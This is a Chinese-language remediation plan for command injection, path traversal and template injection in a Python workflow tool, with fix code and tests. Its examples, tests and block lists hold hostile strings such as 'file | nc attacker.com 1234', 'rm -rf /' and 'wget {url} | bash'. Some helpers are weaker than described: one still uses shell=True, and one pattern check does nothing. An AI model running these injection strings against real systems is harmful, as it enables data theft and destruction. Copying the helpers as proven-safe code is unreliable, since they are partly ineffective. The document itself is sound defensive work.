# 安全问题修复方案

## 执行摘要

本文档详细说明了 deeplazy 项目中发现的三类严重安全漏洞的修复方案:
1. 命令注入漏洞 (严重)
2. 路径遍历漏洞 (严重)  
3. 模板注入漏洞 (高)

---

## 一、命令注入漏洞修复

### 1.1 问题分析

**漏洞位置:**
- `commands.py:133-137` - OLP阶段命令执行
- `commands.py:260` - Batch模式命令执行
- `commands.py:841-842` - Calc阶段命令执行

**根本原因:**
用户可控的路径参数直接传入 `shell=True` 的 `subprocess.run()`,未经过任何验证或转义。

**攻击向量:**
```python
# 恶意路径示例
malicious_path = "/safe/path; rm -rf /"
command_create = ctx.config["commands"]["create_infile"].format(
    poscar=malicious_path,
    scf=scf_path,
)
subprocess.run(command_create, shell=True)  # 命令注入!
```

### 1.2 修复方案

#### 1.2.1 新增安全模块 `dlazy/security.py`

```python
"""安全工具函数 - 防止命令注入、路径遍历、模板注入"""

from __future__ import annotations

import os
import re
import shlex
import subprocess
from pathlib import Path
from typing import Any, Dict, List, Optional, Sequence, Tuple, Union

from .exceptions import SecurityError


def validate_path(
    path: Union[str, Path],
    base_dir: Optional[Path] = None,
    allow_symlinks: bool = True,
    must_exist: bool = False,
) -> Path:
    """
    验证路径安全性，防止路径遍历攻击
    
    Args:
        path: 待验证路径
        base_dir: 基准目录(可选)，路径必须在此目录内
        allow_symlinks: 是否允许符号链接
        must_exist: 路径是否必须存在
        
    Returns:
        解析后的绝对路径
        
    Raises:
        SecurityError: 路径验证失败
        FileNotFoundError: 路径不存在(当must_exist=True)
    """
    try:
        path_obj = Path(path)
        
        # 转换为绝对路径
        if not path_obj.is_absolute():
            if base_dir is None:
                raise SecurityError(f"相对路径需要指定 base_dir: {path}")
            path_obj = (base_dir / path_obj).resolve()
        else:
            path_obj = path_obj.resolve()
        
        # 解析符号链接
        if not allow_symlinks and path_obj.is_symlink():
            raise SecurityError(f"符号链接不被允许: {path_obj}")
        
        # 检查路径是否在基准目录内
        if base_dir is not None:
            base_resolved = base_dir.resolve()
            try:
                path_obj.relative_to(base_resolved)
            except ValueError:
                raise SecurityError(
                    f"路径遍历攻击检测: {path_obj} 不在基准目录 {base_resolved} 内"
                )
        
        # 检查路径是否存在
        if must_exist and not path_obj.exists():
            raise FileNotFoundError(f"路径不存在: {path_obj}")
        
        # 检查危险路径模式
        path_str = str(path_obj)
        dangerous_patterns = [
            r'\.\.',  # 目录遍历
            r'/etc/passwd',
            r'/etc/shadow',
            r'/root/',
            r'\.ssh/',
            r'\.gnupg/',
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, path_str):
                raise SecurityError(f"检测到危险路径模式: {path_obj}")
        
        return path_obj
        
    except SecurityError:
        raise
    except Exception as e:
        raise SecurityError(f"路径验证失败: {path}, 错误: {e}")


def sanitize_shell_arg(arg: Union[str, Path, int, float]) -> str:
    """
    安全转义shell参数，防止命令注入
    
    Args:
        arg: 待转义参数
        
    Returns:
        转义后的安全字符串
    """
    if isinstance(arg, Path):
        arg = str(arg)
    elif isinstance(arg, (int, float)):
        return str(arg)
    
    if not isinstance(arg, str):
        raise SecurityError(f"不支持的参数类型: {type(arg)}")
    
    # 使用shlex.quote进行安全转义
    return shlex.quote(arg)


def safe_format_command(template: str, **kwargs) -> str:
    """
    安全格式化命令模板，防止命令注入
    
    Args:
        template: 命令模板字符串
        **kwargs: 模板参数
        
    Returns:
        格式化后的安全命令字符串
        
    Raises:
        SecurityError: 检测到危险模式
    """
    # 检查模板中的危险模式
    dangerous_patterns = [
        r';',      # 命令分隔符
        r'\|',     # 管道
        r'`',      # 命令替换
        r'\$\(',   # 命令替换
        r'&&',     # 逻辑与
        r'\|\|',   # 逻辑或
        r'>',      # 重定向
        r'<',      # 重定向
    ]
    
    # 先检查模板本身
    for pattern in dangerous_patterns:
        if re.search(pattern, template):
            # 如果模板本身包含这些字符,说明是预期的
            # 但我们需要确保参数值不包含这些
            break
    
    # 安全转义所有参数
    safe_kwargs = {}
    for key, value in kwargs.items():
        if isinstance(value, (str, Path)):
            # 对于字符串和路径,进行安全转义
            safe_kwargs[key] = sanitize_shell_arg(value)
        else:
            safe_kwargs[key] = str(value)
    
    # 使用安全的字符串格式化
    try:
        # 使用format而不是f-string,避免代码注入
        return template.format(**safe_kwargs)
    except KeyError as e:
        raise SecurityError(f"模板参数缺失: {e}")


def run_command_safe(
    command_template: str,
    args: Optional[Dict[str, Any]] = None,
    cwd: Optional[Path] = None,
    env: Optional[Dict[str, str]] = None,
    check: bool = True,
    capture_output: bool = False,
    timeout: Optional[float] = None,
) -> subprocess.CompletedProcess:
    """
    安全执行shell命令
    
    Args:
        command_template: 命令模板
        args: 命令参数字典
        cwd: 工作目录
        env: 环境变量
        check: 是否检查返回码
        capture_output: 是否捕获输出
        timeout: 超时时间(秒)
        
    Returns:
        subprocess.CompletedProcess对象
        
    Raises:
        SecurityError: 安全验证失败
        subprocess.CalledProcessError: 命令执行失败
        subprocess.TimeoutExpired: 命令超时
    """
    args = args or {}
    
    # 验证工作目录
    if cwd is not None:
        cwd = validate_path(cwd, must_exist=True)
    
    # 安全格式化命令
    safe_command = safe_format_command(command_template, **args)
    
    # 执行命令
    try:
        result = subprocess.run(
            safe_command,
            shell=True,
            cwd=str(cwd) if cwd else None,
            env=env,
            check=check,
            capture_output=capture_output,
            text=True,
            timeout=timeout,
        )
        return result
    except subprocess.TimeoutExpired:
        raise
    except subprocess.CalledProcessError as e:
        raise
    except Exception as e:
        raise SecurityError(f"命令执行失败: {e}")


def validate_template_string(template: str) -> bool:
    """
    验证模板字符串是否安全
    
    Args:
        template: 模板字符串
        
    Returns:
        是否安全
        
    Raises:
        SecurityError: 检测到危险模式
    """
    # 检查Python代码注入模式
    dangerous_patterns = [
        r'__import__',
        r'eval\s*\(',
        r'exec\s*\(',
        r'compile\s*\(',
        r'open\s*\(',
        r'os\.system',
        r'subprocess\.',
        r'importlib',
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, template, re.IGNORECASE):
            raise SecurityError(f"模板包含危险代码模式: {pattern}")
    
    return True


def sanitize_filename(filename: str) -> str:
    """
    清理文件名，移除危险字符
    
    Args:
        filename: 原始文件名
        
    Returns:
        安全的文件名
    """
    # 移除路径分隔符
    filename = filename.replace('/', '_').replace('\\', '_')
    
    # 移除危险字符
    dangerous_chars = ['<', '>', ':', '"', '|', '?', '*', '\0']
    for char in dangerous_chars:
        filename = filename.replace(char, '_')
    
    # 移除开头的点和空格(防止隐藏文件)
    filename = filename.lstrip('. ')
    
    # 限制长度
    if len(filename) > 255:
        name, ext = os.path.splitext(filename)
        filename = name[:250] + ext
    
    return filename or 'unnamed'
```

#### 1.2.2 新增安全异常 `dlazy/exceptions.py`

```python
# 在现有 exceptions.py 中添加

class SecurityError(Exception):
    """安全验证失败异常"""
    pass
```

#### 1.2.3 修复 `commands.py` 中的命令注入漏洞

**修复前 (commands.py:133-137):**
```python
command_create = ctx.config["commands"]["create_infile"].format(
    poscar=path,
    scf=scf_path,
)
subprocess.run(command_create, env=env, shell=True, check=True, text=True)
```

**修复后:**
```python
from .security import validate_path, run_command_safe

# 验证路径安全性
validated_poscar = validate_path(path, must_exist=True)
validated_scf = validate_path(scf_path)

# 安全执行命令
run_command_safe(
    ctx.config["commands"]["create_infile"],
    args={
        'poscar': validated_poscar,
        'scf': validated_scf,
    },
    env=env,
    check=True,
)
```

**完整修复示例 (commands.py OLPCommandExecutor.execute):**
```python
@staticmethod
def execute(path: str, ctx: OLPContext) -> Tuple[str, str]:
    """执行单个OLP计算任务"""
    from .security import validate_path, run_command_safe
    
    # 检查节点错误标记
    if ctx.node_error_flag and ctx.node_error_flag.exists():
        return ("skipped", Path(path).name)

    label = path
    write_text(ctx.progress_file, f"{label} start\n", append=True)

    # 生成随机路径
    scf_path, geth_path = generate_random_paths(ctx.result_dir)

    # 创建目录
    ensure_directory(scf_path)
    ensure_directory(geth_path)

    result_line = f"{label} {scf_path} {geth_path}"

    try:
        env = os.environ.copy()
        ntasks = ctx.num_cores // ctx.max_processes

        # 1. 创建输入文件 - 修复命令注入
        validated_path = validate_path(path, must_exist=True)
        run_command_safe(
            ctx.config["commands"]["create_infile"],
            args={
                'poscar': validated_path,
                'scf': scf_path,
            },
            env=env,
            check=True,
        )

        # 2. 运行OpenMX（带节点错误检测）
        os.chdir(scf_path)
        node_error_detected = OLPCommandExecutor._run_openmx_with_monitor(
            ctx.config["commands"]["run_openmx"], ntasks=ntasks
        )

        if node_error_detected:
            write_text(ctx.progress_file, f"{label} error\n", append=True)
            if ctx.node_error_flag and not ctx.node_error_flag.exists():
                ctx.node_error_flag.touch()
            return ("node_error", label)

        # 3. 提取overlap - 修复命令注入
        os.chdir(geth_path)
        run_command_safe(
            ctx.config["commands"]["extract_overlap"],
            args={'scf': scf_path},
            env=env,
            check=True,
        )

        # ... 其余代码不变
```

**修复其他命令执行点:**
- `commands.py:260` - OLP batch模式
- `commands.py:841-842` - Calc阶段
- 所有 `subprocess.run(..., shell=True)` 调用都需要替换为 `run_command_safe()`

---

## 二、路径遍历漏洞修复

### 2.1 问题分析

**漏洞位置:**
- `cli.py:18-19` - 配置文件路径解析
- `cli.py:154-155` - 批处理路径解析

**根本原因:**
用户提供的路径未经验证，可能指向系统敏感文件。

### 2.2 修复方案

#### 修复前 (cli.py:18-19):
```python
config_path = Path(args.config).resolve()
workdir = Path(args.workdir).resolve() if args.workdir else config_path.parent
```

#### 修复后:
```python
from .security import validate_path

def cmd_run(args):
    """运行工作流"""
    from .workflow import WorkflowManager
    from .security import validate_path
    
    # 验证配置文件路径
    config_path = validate_path(
        args.config,
        must_exist=True,
        allow_symlinks=True
    )
    
    # 验证工作目录
    if args.workdir:
        workdir = validate_path(
            args.workdir,
            must_exist=True,
            allow_symlinks=True
        )
    else:
        workdir = config_path.parent
    
    # 检查配置文件是否在工作目录内（可选）
    try:
        config_path.relative_to(workdir)
    except ValueError:
        # 配置文件不在工作目录内，记录警告
        from .utils import get_logger
        logger = get_logger("cli")
        logger.warning("配置文件不在工作目录内: %s", config_path)

    if not config_path.exists():
        print(f"错误: 配置文件不存在: {config_path}", file=sys.stderr)
        sys.exit(1)

    manager = WorkflowManager(config_path=config_path, workdir=workdir)
    manager.run(daemon=args.daemon)
```

**应用到所有CLI命令:**
同样的修复需要应用到:
- `cmd_status()`
- `cmd_stop()`
- `cmd_restart()`
- `cmd_olp()`
- `cmd_infer()`
- `cmd_calc()`
- `cmd_validate()`
- `cmd_batch()`
- `cmd_batch_status()`
- `cmd_batch_stop()`
- `cmd_batch_retry_tasks()`

---

## 三、模板注入漏洞修复

### 3.1 问题分析

**漏洞位置:**
- `template_generator.py:130-184` - OLP脚本生成
- 类似问题在 infer/calc 脚本生成中

**根本原因:**
路径直接嵌入Python代码字符串，特殊字符可能导致代码注入。

### 3.2 修复方案

#### 修复前 (template_generator.py:149):
```python
workflow_root = Path('{workflow_root_arg}')
```

#### 修复后:

**方法1: 使用repr()安全转义**
```python
from .security import validate_path, sanitize_filename

def generate_embedded_olp_script(
    python_path: str,
    config_path: str,
    num_tasks: int,
    slurm_config: Dict[str, Any],
    software_config: Dict[str, Any],
    tasks_file: Optional[str] = None,
    workdir: Optional[str] = None,
    batch_index: Optional[int] = None,
    workflow_root: Optional[str] = None,
) -> str:
    """生成OLP SLURM脚本"""
    
    # 验证所有路径参数
    validated_config = validate_path(config_path, must_exist=True)
    validated_workflow_root = validate_path(workflow_root) if workflow_root else None
    validated_workdir = validate_path(workdir) if workdir else None
    
    # 使用repr()安全转义路径
    safe_config_path = repr(str(validated_config))
    safe_workflow_root = repr(str(validated_workflow_root)) if validated_workflow_root else 'None'
    safe_workdir = repr(str(validated_workdir)) if validated_workdir else 'None'
    
    # 在Python代码中使用安全的字符串字面量
    return f"""#!/bin/bash
#SBATCH --no-requeue
#SBATCH --job-name={job_name}
#SBATCH --array=1-{actual_array_size}

{modules_section}
{env_vars_section}

export BATCH_SIZE={batch_size}

{python_path} - <<'PYTHON_EOF'
import os
import sys

from pathlib import Path
from dlazy.path_resolver import BatchPathResolver
from dlazy.commands import OLPCommandExecutor

try:
    workflow_root = Path({safe_workflow_root})
    config_path = Path({safe_config_path})
    
    # ... 其余代码使用Path对象
PYTHON_EOF
"""
```

**方法2: 通过环境变量传递（更安全）**
```python
def generate_embedded_olp_script(...) -> str:
    """生成OLP SLURM脚本 - 使用环境变量传递路径"""
    
    # 验证路径
    validated_config = validate_path(config_path, must_exist=True)
    
    return f"""#!/bin/bash
#SBATCH --no-requeue
#SBATCH --job-name={job_name}

{modules_section}
{env_vars_section}

# 通过环境变量传递路径（自动转义）
export DLAZY_CONFIG_PATH={shlex.quote(str(validated_config))}
export DLAZY_WORKFLOW_ROOT={shlex.quote(str(workflow_root)) if workflow_root else ''}
export DLAZY_BATCH_INDEX={batch_index if batch_index is not None else ''}

{python_path} - <<'PYTHON_EOF'
import os
import sys
from pathlib import Path

# 从环境变量读取路径（安全）
config_path = Path(os.environ['DLAZY_CONFIG_PATH'])
workflow_root = Path(os.environ['DLAZY_WORKFLOW_ROOT']) if os.environ.get('DLAZY_WORKFLOW_ROOT') else None
batch_index = int(os.environ['DLAZY_BATCH_INDEX']) if os.environ.get('DLAZY_BATCH_INDEX') else None

# ... 其余代码
PYTHON_EOF
"""
```

---

## 四、配置文件安全建议

### 4.1 配置文件验证

新增 `dlazy/config_validator.py`:

```python
"""配置文件安全验证"""

from pathlib import Path
from typing import Any, Dict, List
import re

from .security import validate_path
from .exceptions import SecurityError


def validate_command_template(template: str) -> bool:
    """
    验证命令模板是否安全
    
    Args:
        template: 命令模板字符串
        
    Returns:
        是否安全
        
    Raises:
        SecurityError: 模板不安全
    """
    # 允许的占位符
    allowed_placeholders = [
        'poscar', 'scf', 'geth', 'ntasks',
        'input_dir', 'output_dir', 'parallel',
        'config_path', 'group_index',
    ]
    
    # 提取模板中的占位符
    placeholders = re.findall(r'\{(\w+)\}', template)
    
    # 检查是否有未授权的占位符
    for placeholder in placeholders:
        if placeholder not in allowed_placeholders:
            raise SecurityError(
                f"命令模板包含未授权的占位符: {placeholder}\n"
                f"允许的占位符: {allowed_placeholders}"
            )
    
    # 检查危险命令模式
    dangerous_commands = [
        r'rm\s+-rf',
        r'dd\s+if=',
        r'mkfs',
        r'fdisk',
        r'chmod\s+777',
        r'chown\s+root',
        r'>\s*/etc/',
        r'wget\s+',
        r'curl\s+.*\|',
    ]
    
    for pattern in dangerous_commands:
        if re.search(pattern, template, re.IGNORECASE):
            raise SecurityError(f"命令模板包含危险命令: {pattern}")
    
    return True


def validate_config_section(section: Dict[str, Any], section_name: str) -> List[str]:
    """
    验证配置段的安全性
    
    Args:
        section: 配置段字典
        section_name: 配置段名称
        
    Returns:
        警告消息列表
    """
    warnings = []
    
    # 检查命令模板
    if 'commands' in section:
        for cmd_name, cmd_template in section['commands'].items():
            try:
                if isinstance(cmd_template, str):
                    validate_command_template(cmd_template)
            except SecurityError as e:
                warnings.append(f"[{section_name}] {cmd_name}: {e}")
    
    # 检查路径配置
    path_keys = ['model_dir', 'output_dir', 'input_dir']
    for key in path_keys:
        if key in section:
            try:
                validate_path(section[key])
            except SecurityError as e:
                warnings.append(f"[{section_name}] {key}: {e}")
    
    return warnings


def validate_global_config(config: Dict[str, Any]) -> List[str]:
    """
    验证全局配置的安全性
    
    Args:
        config: 全局配置字典
        
    Returns:
        警告消息列表
    """
    warnings = []
    
    # 检查各个配置段
    sections = ['0olp', '1infer', '2calc']
    for section_name in sections:
        if section_name in config:
            section_warnings = validate_config_section(
                config[section_name], 
                section_name
            )
            warnings.extend(section_warnings)
    
    # 检查软件配置
    if 'software' in config:
        software = config['software']
        for key, value in software.items():
            if isinstance(value, str) and ('/' in value or '\\' in value):
                # 检查是否是路径
                try:
                    validate_path(value)
                except SecurityError as e:
                    warnings.append(f"[software] {key}: {e}")
    
    return warnings
```

### 4.2 在配置加载时添加验证

修改 `utils.py` 中的配置加载函数:

```python
from .config_validator import validate_global_config

def load_global_config_section(
    global_config_path: Path, 
    section: str, 
    config_dir: Optional[Path] = None
) -> Dict[str, Any]:
    """从全局配置中提取指定section的配置，并验证安全性"""
    
    # 验证配置文件路径
    validated_path = validate_path(global_config_path, must_exist=True)
    
    global_config = load_yaml_config(validated_path)
    
    if section not in global_config:
        raise KeyError(f"全局配置中未找到 section: {section}")
    
    # 验证配置安全性
    warnings = validate_global_config(global_config)
    if warnings:
        logger = get_logger("config")
        for warning in warnings:
            logger.warning(warning)
    
    software = global_config.get("software", {})
    return _expand_section_vars(global_config[section], software)
```

---

## 五、测试用例设计

### 5.1 安全测试模块 `tests/test_security.py`

```python
"""安全功能测试"""

import pytest
from pathlib import Path
import tempfile
import os

from dlazy.security import (
    validate_path,
    sanitize_shell_arg,
    safe_format_command,
    run_command_safe,
    sanitize_filename,
    SecurityError,
)
from dlazy.config_validator import (
    validate_command_template,
    validate_global_config,
)


class TestPathValidation:
    """路径验证测试"""
    
    def test_valid_absolute_path(self, tmp_path):
        """测试有效的绝对路径"""
        test_file = tmp_path / "test.txt"
        test_file.write_text("test")
        
        result = validate_path(test_file, must_exist=True)
        assert result == test_file.resolve()
    
    def test_valid_relative_path(self, tmp_path):
        """测试有效的相对路径"""
        test_file = tmp_path / "test.txt"
        test_file.write_text("test")
        
        result = validate_path("test.txt", base_dir=tmp_path, must_exist=True)
        assert result == test_file.resolve()
    
    def test_path_traversal_attack(self, tmp_path):
        """测试路径遍历攻击检测"""
        with pytest.raises(SecurityError, match="路径遍历"):
            validate_path("../../../etc/passwd", base_dir=tmp_path)
    
    def test_symlink_not_allowed(self, tmp_path):
        """测试符号链接检测"""
        target = tmp_path / "target.txt"
        target.write_text("test")
        link = tmp_path / "link.txt"
        link.symlink_to(target)
        
        with pytest.raises(SecurityError, match="符号链接"):
            validate_path(link, allow_symlinks=False)
    
    def test_dangerous_path_patterns(self):
        """测试危险路径模式检测"""
        dangerous_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
        ]
        
        for path in dangerous_paths:
            with pytest.raises(SecurityError):
                validate_path(path)
    
    def test_path_outside_base_dir(self, tmp_path):
        """测试路径在基准目录外"""
        other_dir = tmp_path.parent / "other"
        other_dir.mkdir(exist_ok=True)
        
        with pytest.raises(SecurityError, match="不在基准目录"):
            validate_path(other_dir, base_dir=tmp_path)


class TestShellInjection:
    """Shell注入测试"""
    
    def test_sanitize_simple_string(self):
        """测试简单字符串转义"""
        result = sanitize_shell_arg("simple")
        assert result == "simple"
    
    def test_sanitize_string_with_spaces(self):
        """测试包含空格的字符串"""
        result = sanitize_shell_arg("path with spaces")
        assert result == "'path with spaces'"
    
    def test_sanitize_injection_attempt(self):
        """测试注入攻击防护"""
        malicious_inputs = [
            "file; rm -rf /",
            "file && cat /etc/passwd",
            "file | nc attacker.com 1234",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "file > /etc/passwd",
        ]
        
        for malicious in malicious_inputs:
            result = sanitize_shell_arg(malicious)
            # 结果应该被引号包裹，危险字符被转义
            assert "'" in result or '"' in result
    
    def test_safe_format_command(self):
        """测试安全命令格式化"""
        template = "echo {message}"
        result = safe_format_command(template, message="hello")
        assert result == "echo hello"
    
    def test_safe_format_with_injection(self):
        """测试注入攻击防护"""
        template = "cat {file}"
        
        # 即使传入恶意路径，也应该被转义
        result = safe_format_command(
            template, 
            file="/etc/passwd; rm -rf /"
        )
        
        # 检查注入被防止
        assert "rm -rf" not in result or "'" in result
    
    def test_run_command_safe(self, tmp_path):
        """测试安全命令执行"""
        test_file = tmp_path / "test.txt"
        
        result = run_command_safe(
            "touch {file}",
            args={'file': test_file},
            cwd=tmp_path,
        )
        
        assert test_file.exists()
    
    def test_run_command_with_timeout(self):
        """测试命令超时"""
        with pytest.raises(subprocess.TimeoutExpired):
            run_command_safe(
                "sleep 10",
                timeout=0.1
            )


class TestTemplateInjection:
    """模板注入测试"""
    
    def test_valid_template(self):
        """测试有效模板"""
        template = "echo {poscar} {scf}"
        assert validate_command_template(template) is True
    
    def test_unauthorized_placeholder(self):
        """测试未授权的占位符"""
        template = "cat {password}"
        
        with pytest.raises(SecurityError, match="未授权"):
            validate_command_template(template)
    
    def test_dangerous_command_pattern(self):
        """测试危险命令模式"""
        dangerous_templates = [
            "rm -rf {path}",
            "wget {url} | bash",
            "curl {url} > /etc/hosts",
        ]
        
        for template in dangerous_templates:
            with pytest.raises(SecurityError, match="危险命令"):
                validate_command_template(template)


class TestFilenameSanitization:
    """文件名清理测试"""
    
    def test_sanitize_normal_filename(self):
        """测试正常文件名"""
        assert sanitize_filename("file.txt") == "file.txt"
    
    def test_sanitize_path_traversal(self):
        """测试路径遍历字符清理"""
        assert "/" not in sanitize_filename("../../../etc/passwd")
        assert "\\" not in sanitize_filename("..\\..\\..\\windows\\system32")
    
    def test_sanitize_dangerous_chars(self):
        """测试危险字符清理"""
        dangerous = "file<>:\"|?*.txt"
        result = sanitize_filename(dangerous)
        
        for char in ['<', '>', ':', '"', '|', '?', '*']:
            assert char not in result
    
    def test_sanitize_hidden_file(self):
        """测试隐藏文件名清理"""
        assert not sanitize_filename(".hidden").startswith('.')
    
    def test_sanitize_long_filename(self):
        """测试长文件名截断"""
        long_name = "a" * 300 + ".txt"
        result = sanitize_filename(long_name)
        assert len(result) <= 255


class TestConfigValidation:
    """配置验证测试"""
    
    def test_valid_config(self):
        """测试有效配置"""
        config = {
            "0olp": {
                "commands": {
                    "create_infile": "create {poscar} {scf}"
                }
            }
        }
        
        warnings = validate_global_config(config)
        assert len(warnings) == 0
    
    def test_config_with_dangerous_command(self):
        """测试包含危险命令的配置"""
        config = {
            "0olp": {
                "commands": {
                    "create_infile": "rm -rf {poscar}"
                }
            }
        }
        
        warnings = validate_global_config(config)
        assert len(warnings) > 0
        assert "危险命令" in warnings[0]
    
    def test_config_with_unauthorized_placeholder(self):
        """测试包含未授权占位符的配置"""
        config = {
            "1infer": {
                "commands": {
                    "infer": "python {password}"
                }
            }
        }
        
        warnings = validate_global_config(config)
        assert len(warnings) > 0
        assert "未授权" in warnings[0]


class TestIntegrationSecurity:
    """集成安全测试"""
    
    def test_end_to_end_command_execution(self, tmp_path):
        """端到端命令执行测试"""
        input_file = tmp_path / "input.txt"
        input_file.write_text("test content")
        output_file = tmp_path / "output.txt"
        
        # 模拟安全的工作流
        result = run_command_safe(
            "cp {input} {output}",
            args={
                'input': input_file,
                'output': output_file,
            },
            cwd=tmp_path,
        )
        
        assert output_file.exists()
        assert output_file.read_text() == "test content"
    
    def test_injection_prevention_in_workflow(self, tmp_path):
        """工作流注入防护测试"""
        # 模拟恶意输入
        malicious_path = tmp_path / "file; rm -rf /"
        
        # 应该被安全转义
        from dlazy.security import sanitize_shell_arg
        
        safe_path = sanitize_shell_arg(malicious_path)
        
        # 验证注入被防止
        command = f"cat {safe_path}"
        assert "rm -rf" not in command or "'" in command
```

### 5.2 运行测试

```bash
# 运行所有安全测试
pytest tests/test_security.py -v

# 运行特定测试类
pytest tests/test_security.py::TestPathValidation -v
pytest tests/test_security.py::TestShellInjection -v
pytest tests/test_security.py::TestTemplateInjection -v

# 运行覆盖率测试
pytest tests/test_security.py --cov=dlazy.security --cov-report=html
```

---

## 六、实施建议

### 6.1 实施步骤

1. **第一阶段: 创建安全基础设施** (1-2天)
   - 实现 `dlazy/security.py` 模块
   - 添加 `SecurityError` 异常类
   - 实现配置验证模块
   - 编写单元测试

2. **第二阶段: 修复命令注入漏洞** (2-3天)
   - 修复 `commands.py` 中所有 `shell=True` 的调用
   - 添加路径验证
   - 更新相关测试

3. **第三阶段: 修复路径遍历漏洞** (1-2天)
   - 更新 `cli.py` 中的路径处理
   - 添加路径验证到所有文件操作
   - 更新相关测试

4. **第四阶段: 修复模板注入漏洞** (2-3天)
   - 重构 `template_generator.py`
   - 使用环境变量传递路径
   - 添加模板验证
   - 更新相关测试

5. **第五阶段: 集成测试和验证** (2-3天)
   - 运行完整测试套件
   - 进行安全渗透测试
   - 修复发现的问题
   - 更新文档

### 6.2 代码审查清单

- [ ] 所有 `subprocess.run(..., shell=True)` 都替换为 `run_command_safe()`
- [ ] 所有用户输入的路径都经过 `validate_path()` 验证
- [ ] 所有shell参数都经过 `sanitize_shell_arg()` 转义
- [ ] 所有命令模板都经过 `validate_command_template()` 验证
- [ ] 配置文件在加载时进行安全验证
- [ ] 所有文件名都经过 `sanitize_filename()` 清理
- [ ] 测试覆盖率 > 80%
- [ ] 通过所有安全测试用例

### 6.3 安全最佳实践

1. **最小权限原则**
   - 使用专用用户运行工作流
   - 限制文件系统访问权限
   - 使用chroot或容器隔离

2. **输入验证**
   - 永远不要信任用户输入
   - 使用白名单而非黑名单
   - 尽早验证，快速失败

3. **错误处理**
   - 不要泄露敏感信息
   - 记录所有安全相关事件
   - 实现适当的错误恢复

4. **审计日志**
   - 记录所有命令执行
   - 记录所有文件访问
   - 记录配置变更

5. **定期审查**
   - 定期进行安全代码审查
   - 定期更新依赖项
   - 定期进行渗透测试

---

## 七、附录

### 7.1 安全检查工具脚本

```bash
#!/bin/bash
# security_check.sh - 安全检查脚本

echo "=== 安全代码检查 ==="

echo "1. 检查shell=True的使用..."
grep -r "shell=True" --include="*.py" dlazy/
echo ""

echo "2. 检查未转义的用户输入..."
grep -r "\.format(" --include="*.py" dlazy/ | grep -v "safe_format"
echo ""

echo "3. 检查危险的subprocess调用..."
grep -r "subprocess\." --include="*.py" dlazy/ | grep -v "run_command_safe"
echo ""

echo "4. 检查路径操作..."
grep -r "Path(" --include="*.py" dlazy/ | grep -v "validate_path"
echo ""

echo "=== 检查完成 ==="
```

### 7.2 安全配置示例

```yaml
# global_config.yaml - 安全配置示例

software:
  python_path: "/usr/bin/python3"
  dlazy_path: "/opt/dlazy"

0olp:
  commands:
    # 安全的命令模板 - 使用授权的占位符
    create_infile: "/opt/software/create_input.py --poscar {poscar} --scf {scf}"
    run_openmx: "mpirun -np {ntasks} openmx"
    extract_overlap: "/opt/software/extract.py --scf {scf}"
  
  slurm:
    partition: "compute"
    nodes: 1
    ntasks_per_node: 64

1infer:
  commands:
    transform: "/opt/software/transform.py --input {input_dir} --output {output_dir} --parallel {parallel}"
    infer: "/opt/software/infer.py --config {config_path}"
  
  # 安全限制
  allowed_paths:
    - "/data/workflows"
    - "/opt/models"
  
  # 禁止的路径模式
  forbidden_patterns:
    - "/etc/"
    - "/root/"
    - "*/.ssh/*"

2calc:
  commands:
    create_infile: "/opt/software/create_input.py --poscar {poscar} --scf {scf}"
    run_openmx: "mpirun -np {ntasks} openmx"
    check_conv: "/opt/software/check.py --scf {scf}"
    extract_hamiltonian: "/opt/software/extract.py --scf {scf}"
```

### 7.3 参考资料

1. OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
2. CWE-78: OS Command Injection: https://cwe.mitre.org/data/definitions/78.html
3. CWE-22: Path Traversal: https://cwe.mitre.org/data/definitions/22.html
4. Python Security Best Practices: https://python.readthedocs.io/en/stable/library/security_warnings.html
5. Secure Coding Guidelines for Python: https://python.readthedocs.io/en/stable/library/security_warnings.html

---

**文档版本**: 1.0  
**最后更新**: 2026-03-13  
**作者**: Security Team
